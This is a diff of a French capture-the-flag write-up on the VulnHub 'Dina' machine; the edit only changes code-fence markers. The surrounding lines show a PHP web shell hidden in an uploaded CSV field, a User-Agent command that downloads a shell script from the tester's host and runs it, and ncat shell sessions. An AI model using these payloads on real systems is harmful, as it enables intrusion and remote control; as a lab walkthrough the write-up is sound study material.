@@ -8,7 +8,7 @@ On continue les CTF de chez VulnHub avec le [Dina 1.0.1](https://www.vulnhub.com
 #my secret webapp
 -----------------
 
-```plain
+```
 Nmap scan report for 192.168.1.48
 Host is up (0.00036s latency).
 Not shown: 65528 closed ports
@@ -30,7 +30,7 @@ Un seul port ouvert, un joli *It works* à la racine mais un *index.html* tout d
 
 On retrouve certains des dossiers présents dans le *robots.txt* avec un buster ainsi que des nouveaux :  
 
-```plain
+```
 http://192.168.1.48/cgi-bin/ - HTTP 403 (240 bytes, gzip)
 http://192.168.1.48/doc/ - HTTP 403 (236 bytes, gzip)
 http://192.168.1.48/icons/ - HTTP 403 (238 bytes, gzip)
@@ -60,7 +60,7 @@ iloveroot
 
 Justement il y a une archive *backup.zip* sous */secure/* qui semble nécessiter un mot de passe :  
 
-```plain
+```
 $ unzip backup.zip
 Archive:  backup.zip
    skipping: backup-cred.mp3         need PK compat. v5.1 (can do v4.6)
@@ -78,7 +78,7 @@ Enter password (will not be echoed) :
 
 Et en rentrant le mot de passe *freedom* on obtient un fichier *backup-cred.mp3* qui est en réalité un fichier texte :  
 
-```plain
+```
 I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....
 
 uname: touhid
@@ -104,7 +104,7 @@ Après avoir essayé l'un des switchers j'ai opté pour [celui-ci](https://chrom
 
 Le fichier CSV uploadé à cette forme (il doit respecter les colonnes du phonebook) :  
 
-```plain
+```
 "Name","Mobile","Email","Group Code","Tags"
 "<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>",22,,,
 ```
@@ -117,7 +117,7 @@ Comme pour le précédent challenge j'ai eu recours à [tcp\_pty\_bind.py](https
 
 Mon user-agent était alors *cd /tmp; wget http://192.168.1.6:8000/tcp\_pty\_bind.py; setsid python tcp\_pty\_bind.py&*  
 
-```plain
+```
 $ ncat 192.168.1.48 31337 -v
 Ncat: Version 7.01 ( https://nmap.org/ncat )
 Ncat: Connected to 192.168.1.48:31337.
@@ -134,7 +134,7 @@ Il y a un utilisateur *touhid* qui pourrait être intéressant. Quelques fichier
 
 A tout hasard, peut-on exécuter certaines commandes en tant que root ?   
 
-```plain
+```
 www-data@Dina:/tmp$ sudo -l
 Matching Defaults entries for www-data on this host:
     env_reset,
@@ -148,7 +148,7 @@ Bingo !
 
 Plus qu'à récupérer ce fameux [dc.pl](https://pastebin.com/raw/bq6Zbpya) (pas de quoi me rajeunir) et l'exécuter avec sudo.  
 
-```plain
+```
 Ncat: Version 7.01 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
 Ncat: Listening on 0.0.0.0:9999
